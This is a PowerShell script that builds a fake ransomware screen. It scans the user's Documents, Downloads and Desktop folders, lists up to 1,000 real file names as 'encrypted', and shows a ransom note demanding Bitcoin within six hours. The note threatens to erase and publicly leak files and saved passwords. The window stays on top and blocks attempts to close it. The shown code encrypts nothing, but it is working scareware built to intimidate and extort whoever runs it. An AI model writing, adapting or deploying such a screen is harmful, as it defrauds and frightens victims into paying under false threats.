Add-Type -AssemblyName PresentationFramework,PresentationCore
Add-Type -AssemblyName System.Drawing

# Function to get files from system
function Get-SystemFiles {
    $extensions = @('.heic', '.heif', '.png', '.jpg', '.jpeg', '.cr3', '.mp4', '.mov', '.mkv', 
                   '.gif', '.webp', '.tiff', '.bmp', '.svg', '.psd', '.dng', '.pdf', '.docx', 
                   '.doc', '.txt', '.rtf', '.zip', '.7zip', '.pptx', '.csv', '.xlsx', '.ppt', '.xls')
    
    $allFiles = @()
    $maxFiles = 1000
    
    # Folders to search in order
    $folders = @(
        @{Path = [Environment]::GetFolderPath("MyDocuments"); Name = "Documents"},
        @{Path = [Environment]::GetFolderPath("UserProfile") + "\Downloads"; Name = "Downloads"},
        @{Path = [Environment]::GetFolderPath("Desktop"); Name = "Desktop"}
    )
    
    foreach ($folder in $folders) {
        if ($allFiles.Count -ge $maxFiles) { break }
        
        if (Test-Path $folder.Path) {
            try {
                $files = [System.IO.Directory]::GetFiles($folder.Path, "*.*", [System.IO.SearchOption]::AllDirectories) |
                         Where-Object { $extensions -contains [System.IO.Path]::GetExtension($_).ToLower() }
                
                foreach ($file in $files) {
                    if ($allFiles.Count -ge $maxFiles) { break }
                    
                    try {
                        $fileInfo = New-Object System.IO.FileInfo($file)
                        $allFiles += [PSCustomObject]@{
                            Name = [System.IO.Path]::GetFileName($file)
                            FullPath = $file
                            Extension = [System.IO.Path]::GetExtension($file)
                            Folder = $folder.Name
                        }
                    } catch {}
                }
            } catch {}
        }
    }
    
    return $allFiles | Select-Object -First $maxFiles
}

# Get files for display
$systemFiles = Get-SystemFiles

$w = New-Object System.Windows.Window
$w.Title = "test menu"
$w.Width = 1200  # Increased width for two columns
$w.Height = 900
$w.Topmost = $true
$w.WindowStyle = [System.Windows.WindowStyle]::SingleBorderWindow
$w.ResizeMode = [System.Windows.ResizeMode]::NoResize
$w.WindowStartupLocation = [System.Windows.WindowStartupLocation]::CenterScreen

$g = New-Object System.Windows.Controls.Grid
$g.Background = [System.Windows.Media.Brushes]::DarkRed

# Define columns: Left for text, Right for file list
$col1 = New-Object System.Windows.Controls.ColumnDefinition
$col1.Width = New-Object System.Windows.GridLength(1, 'Star')
$col2 = New-Object System.Windows.Controls.ColumnDefinition
$col2.Width = New-Object System.Windows.GridLength(400)
$g.ColumnDefinitions.Add($col1)
$g.ColumnDefinitions.Add($col2)

$title = New-Object System.Windows.Controls.TextBlock
$title.Text = "Oops.. Your Files Are Encrypted"
$title.Foreground = [System.Windows.Media.Brushes]::White
$title.FontFamily = 'Courier New'
$title.FontSize = 25
$title.FontWeight = [System.Windows.FontWeights]::Bold
$title.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Left
$title.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
$title.Margin = '15,12,0,0'
$title.TextWrapping = [System.Windows.TextWrapping]::Wrap
[System.Windows.Controls.Grid]::SetColumnSpan($title, 2)  # Span both columns
[System.Windows.Controls.Grid]::SetColumn($title, 0)

$b = New-Object System.Windows.Controls.Border
$b.Height = 13
$b.Margin = '0,48,0,0'
$b.Background = [System.Windows.Media.Brushes]::Black
$b.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Stretch
$b.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
[System.Windows.Controls.Grid]::SetColumnSpan($b, 2)  # Span both columns
[System.Windows.Controls.Grid]::SetColumn($b, 0)

# Main text container (left column)
$textContainer = New-Object System.Windows.Controls.Border
$textContainer.Background = [System.Windows.Media.Brushes]::Transparent
$textContainer.Margin = '20,70,20,20'
[System.Windows.Controls.Grid]::SetColumn($textContainer, 0)

$t = New-Object System.Windows.Controls.TextBlock
$t.Foreground = [System.Windows.Media.Brushes]::White
$t.FontFamily = 'Courier New'
$t.FontSize = 14  # Increased from 12
$t.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Left
$t.VerticalAlignment = [System.Windows.VerticalAlignment]::Top
$t.TextWrapping = [System.Windows.TextWrapping]::Wrap

# Create formatted text with Inlines
$t.Inlines.Clear()

# What happened to my computer? (Bold, Larger - changed color to LightSkyBlue)
$run1 = New-Object System.Windows.Documents.Run
$run1.Text = "What happened to my computer?"
$run1.FontWeight = [System.Windows.FontWeights]::Bold
$run1.FontSize = 18
$run1.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue  # Changed from Yellow
$t.Inlines.Add($run1)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())  # Reduced from 2 to 1

# Your important files have been encrypted
$run2 = New-Object System.Windows.Documents.Run
$run2.Text = "Your important files have been encrypted"
$run2.FontWeight = [System.Windows.FontWeights]::Bold
$run2.FontSize = 14
$t.Inlines.Add($run2)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# Body paragraph 1 (reduced spacing)
$run3 = New-Object System.Windows.Documents.Run
$run3.Text = "Many of your documents, pictures, and important files are no longer accessible since they have been encrypted. Do not waste your time trying to get them back, nobody can recover them without our decryption service. Please be aware that this program will automatically erase all of your files if you attempt to get rid of this window, restart your computer, or contact help."
$t.Inlines.Add($run3)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# Can I recover my files? (Bold, Larger - LightSkyBlue)
$run4 = New-Object System.Windows.Documents.Run
$run4.Text = "Can I recover my files?"
$run4.FontWeight = [System.Windows.FontWeights]::Bold
$run4.FontSize = 18
$run4.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue  # Changed from Yellow
$t.Inlines.Add($run4)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# Body paragraph 2 (reduced spacing)
$run5 = New-Object System.Windows.Documents.Run
$run5.Text = "We guarantee that you can recover all of your files safely and easily, however, a payment must be made in order to regain access. You have 6 hours to submit payment. Wait any longer and the price doubles. Please be aware that we have copied all your files onto our server, and will distribute them online if you choose not to pay. This includes your saved emails / passwords."
$t.Inlines.Add($run5)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# How To Pay? (Bold, Larger - LightSkyBlue)
$run6 = New-Object System.Windows.Documents.Run
$run6.Text = "How To Pay?"
$run6.FontWeight = [System.Windows.FontWeights]::Bold
$run6.FontSize = 18
$run6.Foreground = [System.Windows.Media.Brushes]::LightSkyBlue  # Changed from Yellow
$t.Inlines.Add($run6)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# Body paragraph 3 (reduced spacing)
$run7 = New-Object System.Windows.Documents.Run
$run7.Text = "Payment is accepted in BITCOIN only. For more information, click <How to buy bitcoin>. Once acquired, ensure you send the right amount to the correct address indicated in this window. A single wrong character will result in permanent loss of funds."
$t.Inlines.Add($run7)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# Bitcoin address section
$run8 = New-Object System.Windows.Documents.Run
$run8.Text = "BITCOIN ADDRESS FOR PAYMENT:"
$run8.FontWeight = [System.Windows.FontWeights]::Bold
$run8.FontSize = 16
$run8.Foreground = [System.Windows.Media.Brushes]::LightGreen
$t.Inlines.Add($run8)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

$run9 = New-Object System.Windows.Documents.Run
$run9.Text = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
$run9.FontFamily = 'Consolas'
$run9.FontSize = 14
$run9.Foreground = [System.Windows.Media.Brushes]::White
$run9.Background = [System.Windows.Media.Brushes]::Black
$t.Inlines.Add($run9)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# Payment amount
$run10 = New-Object System.Windows.Documents.Run
$run10.Text = "AMOUNT: $150 USD (0.0021 BTC)"
$run10.FontWeight = [System.Windows.FontWeights]::Bold
$run10.FontSize = 14
$run10.Foreground = [System.Windows.Media.Brushes]::LightGoldenrodYellow
$t.Inlines.Add($run10)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

# Decorative warning
$run11 = New-Object System.Windows.Documents.Run
$run11.Text = "⚠️ WARNING: Time remaining: 5 hours 59 minutes"
$run11.FontWeight = [System.Windows.FontWeights]::Bold
$run11.FontSize = 12
$run11.Foreground = [System.Windows.Media.Brushes]::Red
$t.Inlines.Add($run11)
$t.Inlines.Add([System.Windows.Documents.LineBreak]::new())

$run12 = New-Object System.Windows.Documents.Run
$run12.Text = "⚠️ ALL FILES BACKED UP TO SECURE SERVER"
$run12.FontWeight = [System.Windows.FontWeights]::Bold
$run12.FontSize = 12
$run12.Foreground = [System.Windows.Media.Brushes]::OrangeRed
$t.Inlines.Add($run12)

$textContainer.Child = $t

# Right column - File list
$fileContainer = New-Object System.Windows.Controls.Border
$fileContainer.Background = [System.Windows.Media.Brushes]::Black
$fileContainer.BorderBrush = [System.Windows.Media.Brushes]::Gray
$fileContainer.BorderThickness = '1,1,1,1'
$fileContainer.Margin = '0,70,10,20'
[System.Windows.Controls.Grid]::SetColumn($fileContainer, 1)

$fileStack = New-Object System.Windows.Controls.StackPanel
$fileStack.Margin = '5,5,5,5'

# File list title
$fileTitle = New-Object System.Windows.Controls.TextBlock
$fileTitle.Text = "ENCRYPTED FILES ($($systemFiles.Count) files)"
$fileTitle.Foreground = [System.Windows.Media.Brushes]::Red
$fileTitle.FontFamily = 'Courier New'
$fileTitle.FontSize = 16
$fileTitle.FontWeight = [System.Windows.FontWeights]::Bold
$fileTitle.Margin = '0,0,0,10'
$fileTitle.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$fileStack.Children.Add($fileTitle)

# Folder indicators
$folderIndicators = New-Object System.Windows.Controls.StackPanel
$folderIndicators.Orientation = 'Horizontal'
$folderIndicators.HorizontalAlignment = 'Center'
$folderIndicators.Margin = '0,0,0,10'

$docIndicator = New-Object System.Windows.Controls.Label
$docIndicator.Content = "📁 Documents"
$docIndicator.Foreground = [System.Windows.Media.Brushes]::LightBlue
$docIndicator.FontSize = 11
$docIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($docIndicator)

$dlIndicator = New-Object System.Windows.Controls.Label
$dlIndicator.Content = "📥 Downloads"
$dlIndicator.Foreground = [System.Windows.Media.Brushes]::LightGreen
$dlIndicator.FontSize = 11
$dlIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($dlIndicator)

$deskIndicator = New-Object System.Windows.Controls.Label
$deskIndicator.Content = "🖥️ Desktop"
$deskIndicator.Foreground = [System.Windows.Media.Brushes]::LightGoldenrodYellow
$deskIndicator.FontSize = 11
$deskIndicator.Margin = '5,0,5,0'
$folderIndicators.Children.Add($deskIndicator)

$fileStack.Children.Add($folderIndicators)

# Create scroll viewer for file list
$scrollViewer = New-Object System.Windows.Controls.ScrollViewer
$scrollViewer.VerticalScrollBarVisibility = 'Auto'
$scrollViewer.Height = 700

$fileListPanel = New-Object System.Windows.Controls.StackPanel

# Add files to the list with folder-based styling
$currentFolder = ""
foreach ($file in $systemFiles) {
    if ($currentFolder -ne $file.Folder) {
        $currentFolder = $file.Folder
        
        # Add folder header
        $folderHeader = New-Object System.Windows.Controls.TextBlock
        $folderHeader.Text = "=== $currentFolder ==="
        $folderHeader.Foreground = if ($currentFolder -eq "Documents") { [System.Windows.Media.Brushes]::LightBlue }
                                   elseif ($currentFolder -eq "Downloads") { [System.Windows.Media.Brushes]::LightGreen }
                                   else { [System.Windows.Media.Brushes]::LightGoldenrodYellow }
        $folderHeader.FontWeight = [System.Windows.FontWeights]::Bold
        $folderHeader.FontSize = 12
        $folderHeader.Margin = '0,10,0,5'
        $fileListPanel.Children.Add($folderHeader)
    }
    
    # Create file entry
    $fileEntry = New-Object System.Windows.Controls.StackPanel
    $fileEntry.Orientation = 'Horizontal'
    $fileEntry.Margin = '5,2,5,2'
    
    # File icon based on extension
    $icon = switch ($file.Extension.ToLower()) {
        {$_ -in '.pdf'} { '📄' }
        {$_ -in '.doc', '.docx', '.txt', '.rtf'} { '📝' }
        {$_ -in '.xls', '.xlsx', '.csv'} { '📊' }
        {$_ -in '.ppt', '.pptx'} { '📽️' }
        {$_ -in '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp'} { '🖼️' }
        {$_ -in '.mp4', '.mov', '.mkv'} { '🎬' }
        {$_ -in '.heic', '.heif', '.cr3', '.dng', '.psd'} { '📷' }
        {$_ -in '.zip', '.7zip'} { '📦' }
        default { '📁' }
    }
    
    $iconText = New-Object System.Windows.Controls.TextBlock
    $iconText.Text = $icon
    $iconText.FontSize = 12
    $iconText.Margin = '0,0,5,0'
    $fileEntry.Children.Add($iconText)
    
    $fileName = New-Object System.Windows.Controls.TextBlock
    $fileName.Text = $file.Name
    $fileName.Foreground = [System.Windows.Media.Brushes]::White
    $fileName.FontSize = 11
    $fileName.FontFamily = 'Consolas'
    $fileName.TextTrimming = 'CharacterEllipsis'
    $fileName.Width = 300
    $fileEntry.Children.Add($fileName)
    
    $statusIcon = New-Object System.Windows.Controls.TextBlock
    $statusIcon.Text = " 🔒"
    $statusIcon.Foreground = [System.Windows.Media.Brushes]::Red
    $statusIcon.FontSize = 10
    $fileEntry.Children.Add($statusIcon)
    
    $fileListPanel.Children.Add($fileEntry)
}

$scrollViewer.Content = $fileListPanel
$fileStack.Children.Add($scrollViewer)

# File count summary
$fileSummary = New-Object System.Windows.Controls.TextBlock
$fileSummary.Text = "Total encrypted files: $($systemFiles.Count) of 104,366"
$fileSummary.Foreground = [System.Windows.Media.Brushes]::Red
$fileSummary.FontSize = 12
$fileSummary.FontWeight = [System.Windows.FontWeights]::Bold
$fileSummary.Margin = '0,10,0,0'
$fileSummary.HorizontalAlignment = [System.Windows.HorizontalAlignment]::Center
$fileStack.Children.Add($fileSummary)

$fileContainer.Child = $fileStack

# Add all elements to grid
$null = $g.Children.Add($textContainer)
$null = $g.Children.Add($fileContainer)
$null = $g.Children.Add($b)
$null = $g.Children.Add($title)

$w.Content = $g

$w.Add_Closing({ param($s,$e) $e.Cancel = $true })

$null = $w.ShowDialog()
